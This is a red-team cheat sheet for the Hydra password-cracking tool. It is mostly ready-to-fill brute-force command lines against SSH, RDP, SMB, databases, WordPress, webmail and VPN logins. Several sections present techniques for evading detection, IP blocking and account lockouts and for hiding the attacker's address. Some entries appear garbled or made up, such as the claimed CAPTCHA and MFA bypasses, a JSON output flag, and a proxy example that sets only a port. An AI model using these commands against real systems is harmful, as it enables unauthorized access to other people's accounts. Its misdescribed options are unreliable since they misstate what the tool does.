# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# Hydra

Hydra is a powerful and flexible password-cracking tool that supports a wide range of protocols and services. It is commonly used in penetration testing to perform brute-force attacks on various services to gain unauthorized access. This ultimate edition of the Hydra cheat sheet provides a comprehensive list of commands, usage scenarios, and advanced techniques.

## Basic Syntax
```bash
hydra [options] <target_ip> <service> <additional parameters>
```

## Core Options
- `-l <username>`: Specify a single username.
- `-L <username_list>`: Specify a file containing a list of usernames.
- `-p <password>`: Specify a single password.
- `-P <password_list>`: Specify a file containing a list of passwords.
- `-e <nsr>`: Bruteforce with `n` (null password), `s` (same as username), `r` (reverse username).
- `-s <target_port>`: Specify the port if it's different from the default port for the service.
- `-t <tasks>`: Number of parallel tasks (threads).
- `-o <output_file>`: Write the found credentials to a file.
- `-f`: Exit after the first pair found.
- `-V`: Verbose mode, showing the login and password for every attempt.
- `-v`: Show login and password for every failed attempt.
- `-d`: Enable debug output, showing detailed information.
- `-I`: Ignore an existing restore file.
- `-R`: Restore a previous session from a restore file.
- `-u`: Loop around users, trying all passwords for each user.
- `-S`: Connect via SSL.
- `-F`: Exit after the first valid pair of credentials is found for each user.

# Commands and Use Cases

#### Common Bruteforce Attacks

1. **SSH Bruteforce Attack**: Performs a brute-force attack against the SSH service on the target IP.
    ```bash
    hydra -l <username> -P <password_list> ssh://<target_ip>
    ```
2. **FTP Bruteforce Attack**: Performs a brute-force attack against the FTP service on the target IP.
    ```bash
    hydra -l <username> -P <password_list> ftp://<target_ip>
    ```
3. **HTTP Basic Authentication Bruteforce**: Performs a brute-force attack against a web page protected by HTTP Basic Authentication.
    ```bash
    hydra -l <username> -P <password_list> http-get://<target_ip>/<path>
    ```
4. **SMTP Bruteforce Attack**: Brute-forces the SMTP service on the default port (25).
    ```bash
    hydra -l <username> -P <password_list> smtp://<target_ip> -s 25
    ```
5. **POP3 Bruteforce Attack**: Brute-forces the POP3 service on the default port (110).
    ```bash
    hydra -l <username> -P <password_list> pop3://<target_ip> -s 110
    ```
6. **MySQL Bruteforce Attack**: Performs a brute-force attack against a MySQL database.
    ```bash
    hydra -l <username> -P <password_list> mysql://<target_ip>
    ```
7. **RDP (Remote Desktop Protocol) Bruteforce**: Brute-forces the RDP service on the target IP.
    ```bash
    hydra -l <username> -P <password_list> rdp://<target_ip>
    ```

# Penetration Testing Techniques

#### Bruteforce Techniques

1. **Using Username and Password Combinations**: Attempts every combination of usernames and passwords from the provided lists.
    ```bash
    hydra -L <username_list> -P <password_list> ssh://<target_ip>
    ```
2. **Brute-force with Null, Same, and Reverse Passwords**: Tries null passwords, the username as the password, and the reverse of the username as the password.
    ```bash
    hydra -l <username> -P <password_list> -e nsr ssh://<target_ip>
    ```
3. **Brute-force Multiple Services Simultaneously**: Simultaneously brute-forces multiple services on the same target.
    ```bash
    hydra -l <username> -P <password_list> ssh://<target_ip> ftp://<target_ip> http-get://<target_ip>/<path>
    ```
4. **Throttling Attack Speed**: Limits the number of parallel tasks to 4 to avoid overwhelming the target service.
    ```bash
    hydra -l <username> -P <password_list> -t 4 ssh://<target_ip>
    ```
5. **Evading Detection with Random Delays**: Introduces a 5-second delay between each attempt to evade detection by security mechanisms.
    ```bash
    hydra -l <username> -P <password_list> -t 4 -w 5 ssh://<target_ip>
    ```
6. **Brute-force with Custom Headers (HTTP)**: Uses custom HTTP headers in brute-force attacks, useful for bypassing some security mechanisms.
    ```bash
    hydra -l <username> -P <password_list> -m "Authorization: Basic <base64_encoded_credentials>" http-get://<target_ip>/<path>
    ```
7. **Brute-forcing with a Proxy**: Routes the brute-force attack through a proxy server to hide the attacker's IP address.
    ```bash
    hydra -l <username> -P <password_list> -s <proxy_port> -o <output_file> -e nsr ssh://<target_ip>
    ```
8. **Distributed Brute-force Using Multiple Machines**: Distributes the brute-force attack across multiple machines by specifying a list of targets.
    ```bash
    hydra -l <username> -P <password_list> -M <target_list> -t 64 -f -o <output_file>
    ```

#### Brute-forcing Specific Services

1. **WordPress Login Bruteforce**: Targets the WordPress login page using a POST request.
    ```bash
    hydra -L <username_list> -P <password_list> http-post-form "wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"
    ```
2. **Brute-forcing a SQL Server**: Targets Microsoft SQL Server for brute-forcing.
    ```bash
    hydra -l <username> -P <password_list> mssql://<target_ip>
    ```
3. **VNC Bruteforce Attack**: Targets a VNC server on the default port (5900) for brute-forcing.
    ```bash
    hydra -P <password_list> vnc://<target_ip> -s 5900
    ```
4. **Brute-forcing an SNMP Community String**: Targets the SNMP service to brute-force the community string.
    ```bash
    hydra -P <password_list> snmp://<target_ip> -vV
    ```
5. **SMB Bruteforce Attack**: Performs a brute-force attack against SMB services on the target.
    ```bash
    hydra -L <username_list> -P <password_list> smb://<target_ip>
    ```
6. **Telnet Bruteforce Attack**: Targets the Telnet service for brute-forcing.
    ```bash
    hydra -l <username> -P <password_list> telnet://<target_ip>
    ```
7. **LDAP Bruteforce Attack**: Performs a brute-force attack against LDAP services.
    ```bash
    hydra -L <username_list> -P <password_list> ldap://<target_ip>
    ```
8. **PostgreSQL Bruteforce Attack**: Targets PostgreSQL databases for brute-forcing.
    ```bash
    hydra -l <username> -P <password_list> postgres://<target_ip>
    ```

#### Optimizing Brute-force Attacks

1. **Resume a Previous Attack Session**: Resumes an attack from the last saved session, useful for long-running brute-force attempts.
    ```bash
    hydra -R
    ```
2. **Output Results in a Specific Format**: Saves the output in JSON format for easy parsing and further analysis.
    ```bash
    hydra -l <username> -P <password_list> -o results.txt -b json ssh://<target_ip>
    ```
3. **Avoid Lockouts by Limiting Attempts**: Limits the number of failed attempts per user to avoid account lockout mechanisms.
    ```bash
    hydra -l <username> -P <password_list> -t 4 -W 3 -s <target_port> ssh://<target_ip>
    ```
4. **Speed Optimization with Parallel Tasks**: Maximizes the attack speed by using 64 parallel tasks, suitable for high-performance targets.
    ```bash
    hydra -l <username> -P <password_list> -t 64 ssh://<target_ip>
    ```
5. **Using Password Masking to Reduce Attack Surface**: Uses password masking to generate passwords within a specific character set and length, reducing the attack surface.
    ```bash
    hydra -l <username> -x 6:8:aA1 -P <password_list> ssh://<target_ip>
    ```
6. **Evading IP-based Blocking**: Routes traffic through a SOCKS5 proxy to evade IP-based blocking mechanisms.
    ```bash
    hydra -l <username> -P <password_list> -s <proxy_port> -V -X socks5://<proxy_ip>:<proxy_port> ssh://<target_ip>
    ```
7. **Combining Wordlists for Comprehensive Attacks**: Combines multiple wordlists to ensure comprehensive coverage during brute-force attacks.
    ```bash
    cat wordlist1.txt wordlist2.txt | hydra -l <username> -P - ssh://<target_ip>
    ```
8. **Using CAPTCHA Bypass Techniques**: Incorporates CAPTCHA bypassing techniques for brute-forcing web applications that use CAPTCHA.
    ```bash
    hydra -l <username> -P <password_list> -m "captcha_field=captcha_code" http-get://<target_ip>/login
    ```

#### Real-world Use Cases and Scenarios

1. **Brute-force Attack on a VPN**: Targets VPN services using IKE for brute-forcing.
    ```bash
    hydra -l <username> -P <password_list> ike://<target_ip>
    ```
2. **Cracking Passwords for an Email Server**: Brute-forces an email server using the IMAP protocol.
    ```bash
    hydra -l <username> -P <password_list> imap://<target_ip>
    ```
3. **Bypassing Account Lockouts with Incremental Delays**: Introduces a delay after each failed attempt to avoid triggering account lockouts.
    ```bash
    hydra -l <username> -P <password_list> -t 1 -W 60 ssh://<target_ip>
    ```
4. **Attack Against Multi-factor Authentication (MFA)**: Attempts to bypass MFA by brute-forcing the OTP field along with the password.
    ```bash
    hydra -l <username> -P <password_list> -m "otp_field=123456" http-post-form://<target_ip>/login
    ```
5. **Brute-force Attack on a Webmail Login**: Targets a webmail login page for brute-forcing.
    ```bash
    hydra -L <username_list> -P <password_list> http-post-form "https://<target_ip>/login.php:username=^USER^&password=^PASS^:F=invalid"
    ```
6. **Targeted Attack on High-Value Accounts**: Focuses on high-value accounts like "admin" with custom SSH ports.
    ```bash
    hydra -l admin -P <password_list> ssh://<target_ip> -s 2222
    ```
7. **Exploiting Weak Password Policies**: Targets weak password policies by generating passwords of specific lengths and characters.
    ```bash
    hydra -l <username> -x 6:6:a -P <password_list> ssh://<target_ip>
    ```
8. **Distributed Brute-force Across Multiple Targets**: Distributes brute-force efforts across multiple targets to cover a larger attack surface.
    ```bash
    hydra -L <username_list> -P <password_list> -M <target_list> -t 64 -o results.txt
    ```

# Resources

|**Name**|**URL**|
|---|---|
|Hydra Documentation|https://github.com/vanhauser-thc/thc-hydra|
|Explaining Hydra Parameters|https://null-byte.wonderhowto.com/how-to/hacking-wifi-guide-using-hydra-crack-weak-passwords-0185154/|
|Brute-force Techniques with Hydra|https://www.hackingtutorials.org/brute-force/cracking-passwords-hydra/|
|Hydra in Action: Real-world Examples|https://www.offensive-security.com/metasploit-unleashed/password-attacks/|
|Defensive Countermeasures Against Hydra|https://www.sans.org/white-papers/defense-mechanisms-against-brute-force-attacks-970/|
|Advanced Hydra Usage|https://null-byte.wonderhowto.com/how-to/advanced-password-attacks-with-hydra-0195581/|
|Custom Scripts with Hydra|https://securitytrails.com/blog/password-cracking-tools|
|Hydra in CTF Challenges|https://ctftime.org/writeups/overview/hydra|
|Automating Hydra for Pentests|https://www.pentestpartners.com/security-blog/automating-password-attacks-using-hydra/|
|Optimizing Hydra Performance|https://www.irongeek.com/i.php?page=security/hydra-tips-tricks|